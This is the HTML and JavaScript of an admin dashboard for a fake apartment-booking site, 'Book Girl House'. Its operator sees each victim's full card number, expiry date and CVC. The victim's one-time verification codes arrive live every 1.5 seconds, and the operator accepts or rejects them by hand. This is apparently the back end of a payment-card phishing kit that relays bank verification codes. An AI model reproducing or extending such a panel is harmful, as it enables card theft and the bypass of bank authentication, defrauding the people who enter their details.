<!doctype html>
<html lang="uk">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Book Girl House — Адмінка</title>
<link rel="icon" href="/favicon.svg" type="image/svg+xml">
<link rel="stylesheet" href="/style.css?v=26">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
</head>
<body class="admin-body">
<header class="admin-header">
  <div class="admin-brand">
    <span class="admin-mark">BGH</span>
    <span>Book Girl House <small>• Admin</small></span>
  </div>
  <div class="admin-header-actions">
    <div class="lang-switch admin-lang" id="langSwitch">
      <button type="button" data-lang="uk" class="active">UA</button>
      <button type="button" data-lang="en">EN</button>
    </div>
    <button id="logout" class="admin-btn ghost hidden" data-i18n="logout">Вийти</button>
  </div>
</header>

<main class="admin-wrap">
  <section id="login" class="admin-login">
    <div class="admin-login-card">
      <div class="admin-kicker" data-i18n="kicker">Панель менеджера</div>
      <h1 data-i18n="loginTitle">Вхід до адмін-панелі</h1>
      <p class="admin-muted" data-i18n="loginHint">Тут зʼявляються бронювання та коди, введені клієнтами.</p>

      <label class="admin-field">
        <span data-i18n="login">Логін</span>
        <input id="user" value="admin" autocomplete="username">
      </label>
      <label class="admin-field">
        <span data-i18n="password">Пароль</span>
        <input id="pass" type="password" placeholder="" autocomplete="current-password">
      </label>

      <button id="loginBtn" class="admin-btn primary full" data-i18n="signIn">Увійти</button>
      <p id="loginErr" class="admin-error"></p>
    </div>
  </section>

  <section id="dashboard" class="hidden">
    <div class="admin-dashhead">
      <div>
        <div class="admin-kicker" data-i18n="workspace">Робоча область</div>
        <h1 data-i18n="leads">Заявки</h1>
        <p class="admin-muted" data-i18n="leadsHint">Клієнт вводить код — менеджер бачить його тут і вручну приймає рішення.</p>
      </div>
      <button id="refresh" class="admin-btn secondary" data-i18n="refresh">Оновити</button>
    </div>

    <div class="admin-stats">
      <div class="admin-stat"><b id="all">0</b><span data-i18n="statAll">Всього</span></div>
      <div class="admin-stat wait"><b id="waiting">0</b><span data-i18n="statWait">Очікують вводу</span></div>
      <div class="admin-stat review"><b id="review">0</b><span data-i18n="statReview">Чекають перевірки</span></div>
      <div class="admin-stat retry"><b id="retry">0</b><span data-i18n="statRetry">Потрібен повтор</span></div>
      <div class="admin-stat ok"><b id="confirmed">0</b><span data-i18n="statOk">Підтверджено</span></div>
    </div>

    <div id="cards" class="admin-leads"></div>
  </section>
</main>

<script>
const $=id=>document.getElementById(id);
let pollTimer=null;

const I18N = {
  uk: {
    docTitle: "Book Girl House — Адмінка",
    logout: "Вийти",
    kicker: "Панель менеджера",
    loginTitle: "Вхід до адмін-панелі",
    loginHint: "Тут зʼявляються бронювання та коди, введені клієнтами.",
    login: "Логін",
    password: "Пароль",
    signIn: "Увійти",
    signingIn: "Входимо…",
    workspace: "Робоча область",
    leads: "Заявки",
    leadsHint: "Клієнт вводить код — менеджер бачить його тут і вручну приймає рішення.",
    refresh: "Оновити",
    statAll: "Всього",
    statWait: "Очікують вводу",
    statReview: "Чекають перевірки",
    statRetry: "Потрібен повтор",
    statOk: "Підтверджено",
    empty: "Заявок поки немає.",
    loginFail: "Не вдалося увійти",
    noConn: "Немає зʼєднання з сервером.",
    approve: "✓ Код підходить",
    reject: "✕ Код не підходить",
    invalidCard: "🚫 Картка недійсна",
    noCodeYet: "Клієнт ще не ввів код",
    retryNotice: "↻ Клієнт натиснув «Надіслати код ще раз». Передайте йому новий код.",
    codeEntered: "Код, який ввів клієнт",
    lastBadCode: "Останній введений код (не підійшов)",
    result: "Результат",
    resConfirmed: "Код підтверджено менеджером ✓",
    resRejected: "Код не підійшов. Клієнту доступна кнопка повторного запиту.",
    resRetryReq: "Клієнт запросив новий код — надішліть йому новий код.",
    resReview: "Клієнт ввів код — потрібне рішення менеджера.",
    resWaiting: "Очікується введення коду клієнтом.",
    resInvalidCard: "Картку відхилено. Клієнту показано повідомлення і форма скинута.",
    attempts: "Спроб",
    delete: "Видалити",
    deleteConfirm: "Видалити заявку?",
    booking: "Бронь",
    card: "Картка",
    expiry: "Термін",
    innerCode: "CVC",
    notSpecified: "Не вказано",
    service: "Послуга",
    leadId: "Заявка",
  },
  en: {
    docTitle: "Book Girl House — Admin",
    logout: "Log out",
    kicker: "Manager panel",
    loginTitle: "Admin sign in",
    loginHint: "Bookings and codes entered by clients appear here.",
    login: "Login",
    password: "Password",
    signIn: "Sign in",
    signingIn: "Signing in…",
    workspace: "Workspace",
    leads: "Leads",
    leadsHint: "Client enters a code — the manager sees it here and decides manually.",
    refresh: "Refresh",
    statAll: "Total",
    statWait: "Awaiting code",
    statReview: "Need review",
    statRetry: "Need retry",
    statOk: "Confirmed",
    empty: "No leads yet.",
    loginFail: "Could not sign in",
    noConn: "No connection to the server.",
    approve: "✓ Code OK",
    reject: "✕ Reject code",
    invalidCard: "🚫 Invalid card",
    noCodeYet: "Client has not entered a code yet",
    retryNotice: "↻ Client pressed “Send code again”. Please provide a new code.",
    codeEntered: "Code entered by client",
    lastBadCode: "Last entered code (rejected)",
    result: "Result",
    resConfirmed: "Code confirmed by manager ✓",
    resRejected: "Code rejected. Client can request a new one.",
    resRetryReq: "Client requested a new code — send them a new code.",
    resReview: "Client entered a code — manager decision needed.",
    resWaiting: "Waiting for the client to enter the code.",
    resInvalidCard: "Card declined. Client saw the message and the form was reset.",
    attempts: "Attempts",
    delete: "Delete",
    deleteConfirm: "Delete this lead?",
    booking: "Booking",
    card: "Card",
    expiry: "Expiry",
    innerCode: "CVC",
    notSpecified: "Not specified",
    service: "Service",
    leadId: "Lead",
  }
};

function lang(){ return localStorage.getItem("fitpass_lang") || "uk"; }
function t(key){ return (I18N[lang()] || I18N.uk)[key]; }

function applyLang(l){
  const dict = I18N[l] || I18N.uk;
  document.documentElement.lang = l === "en" ? "en" : "uk";
  document.title = dict.docTitle;
  document.querySelectorAll("[data-i18n]").forEach(el=>{
    const key = el.getAttribute("data-i18n");
    if(dict[key] != null) el.textContent = dict[key];
  });
  document.querySelectorAll("#langSwitch button").forEach(b=>{
    b.classList.toggle("active", b.dataset.lang === l);
  });
  localStorage.setItem("fitpass_lang", l);
  if(!$('dashboard').classList.contains('hidden')) load();
}

document.querySelectorAll("#langSwitch button").forEach(b=>{
  b.addEventListener("click", ()=>applyLang(b.dataset.lang));
});

function isStatus(x, keys){
  const map = {
    waiting: ["Очікує введення коду","Ожидает ввода кода"],
    review: ["Очікує рішення менеджера","Ожидает решения менеджера"],
    retry: ["Код не підійшов — повторне введення","Код не подошёл — повторный ввод"],
    retryReq: ["Клієнт запросив новий код","Клиент запросил новый код"],
    ok: ["Підтверджено","Подтверждено"],
    invalid: ["Картка недійсна","Карта недействительна","Card invalid"],
  };
  return (map[keys]||[]).includes(x.status);
}

async function check(){
  const r=await fetch('/api/me');
  const d=await r.json();
  if(d.authenticated)showDash();
}
function showDash(){
  $('login').classList.add('hidden');
  $('dashboard').classList.remove('hidden');
  $('logout').classList.remove('hidden');
  load();
  if(!pollTimer)pollTimer=setInterval(load,1500);
}

$('loginBtn').onclick=async()=>{
  $('loginErr').textContent='';
  const btn=$('loginBtn');
  btn.disabled=true;
  btn.textContent=t('signingIn');
  try{
    const r=await fetch('/api/login',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({username:$('user').value.trim(),password:$('pass').value})
    });
    const d=await r.json();
    if(r.ok){showDash();}
    else{$('loginErr').textContent=d.error||t('loginFail');btn.disabled=false;btn.textContent=t('signIn');}
  }catch(e){
    $('loginErr').textContent=t('noConn');
    btn.disabled=false;
    btn.textContent=t('signIn');
  }
};

$('pass').addEventListener('keydown',e=>{if(e.key==='Enter')$('loginBtn').click()});
$('user').addEventListener('keydown',e=>{if(e.key==='Enter')$('loginBtn').click()});

async function load(){
  const r=await fetch('/api/leads');
  if(r.status===401){if(pollTimer){clearInterval(pollTimer);pollTimer=null;}return;}
  const a=await r.json();

  $('all').textContent=a.length;
  $('waiting').textContent=a.filter(x=>isStatus(x,'waiting')||isStatus(x,'retryReq')).length;
  $('review').textContent=a.filter(x=>isStatus(x,'review')).length;
  $('retry').textContent=a.filter(x=>isStatus(x,'retry')).length;
  $('confirmed').textContent=a.filter(x=>isStatus(x,'ok')).length;

  $('cards').innerHTML=a.length?a.map(card).join(''):`<div class="admin-empty">${t('empty')}</div>`;
}

function esc(s){return String(s??'').replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[m]))}

function card(x){
  const review=isStatus(x,'review');
  const retryRequested=isStatus(x,'retryReq');
  const invalid=isStatus(x,'invalid');
  const ok=isStatus(x,'ok');
  const canInvalid=!ok && !invalid;

  const badgeClass=
    ok?'ok':
    invalid?'invalid':
    review?'review':
    isStatus(x,'retry')?'retry':'waiting';

  let action='';
  if(review){
    action=`
      <button class="admin-btn success" onclick="decision(${x.id},'approve')">${t('approve')}</button>
      <button class="admin-btn warn" onclick="decision(${x.id},'reject')">${t('reject')}</button>`;
  }
  if(canInvalid){
    action += `<button class="admin-btn danger-soft" onclick="decision(${x.id},'invalid_card')">${t('invalidCard')}</button>`;
  }

  const codeView=x.submitted_code
    ? `<strong class="entered-code">${esc(x.submitted_code)}</strong>`
    : x.rejected_code
      ? `<strong class="entered-code rejected-code">${esc(x.rejected_code)}</strong>`
      : `<span class="no-code">${t('noCodeYet')}</span>`;

  const retryNote=retryRequested
    ? `<div class="retry-notice">${t('retryNotice')}</div>`
    : '';

  const codeLabel = (x.rejected_code && isStatus(x,'retry')) ? t('lastBadCode') : t('codeEntered');

  let resultText = t('resWaiting');
  if(ok) resultText = t('resConfirmed');
  else if(invalid) resultText = t('resInvalidCard');
  else if(isStatus(x,'retry')) resultText = t('resRejected');
  else if(isStatus(x,'retryReq')) resultText = t('resRetryReq');
  else if(review) resultText = t('resReview');

  const attention = review || retryRequested ? 'attention' : '';

  return `<article class="leadcard ${attention}">
    <div class="leadtop">
      <div>
        <div class="lead-name">${esc(x.name||t('notSpecified'))}</div>
        <div class="lead-meta">#${x.id} · ${esc(x.created_at?new Date(x.created_at).toLocaleString(lang()==='en'?'en-US':'uk-UA'):'')}</div>
      </div>
      <span class="badge ${badgeClass}">${esc(x.status)}</span>
    </div>

    <div class="leadgrid">
      <div><b>${t('service')}</b><span>${esc(x.service_type || 'apartments')}</span></div>
      <div><b>${t('booking')}</b><span>${esc(x.booking)}</span></div>
      <div><b>Email</b><span>${esc(x.email||'—')}</span></div>
      <div><b>${t('card')}</b><span class="mono">${esc((x.card_number||'').replace(/(\d{4})(?=\d)/g,'$1 '))}</span></div>
      <div><b>${t('expiry')}</b><span>${esc(x.expiry)}</span></div>
      <div><b>${t('innerCode')}</b><span class="mono">${esc(x.card_code)}</span></div>
    </div>

    ${retryNote}

    <div class="codebox ${review?'codebox-live':''}">
      <div class="codebox-main">
        <b>${codeLabel}</b>
        <span>${codeView}</span>
      </div>
      <div class="codeactions">${action}</div>
    </div>

    <div class="result-row">
      <b>${t('result')}:</b>
      <span>${resultText}${x.attempts?` · ${t('attempts')}: ${x.attempts}`:''}${x.last_attempt_at?` · ${new Date(x.last_attempt_at).toLocaleString(lang()==='en'?'en-US':'uk-UA')}`:''}</span>
    </div>

    <div class="cardactions">
      <button class="admin-btn ghost danger-text" onclick="removeLead(${x.id})">${t('delete')}</button>
    </div>
  </article>`;
}

async function decision(id,decision){
  await fetch('/api/leads/'+id+'/decision',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({decision})
  });
  load();
}

async function removeLead(id){
  if(!confirm(t('deleteConfirm')))return;
  await fetch('/api/leads/'+id,{method:'DELETE'});
  load();
}

$('refresh').onclick=load;
$('logout').onclick=async()=>{
  await fetch('/api/logout',{method:'POST'});
  if(pollTimer)clearInterval(pollTimer);
  location.reload();
};

applyLang(lang());
check();
</script>
</body>
</html>
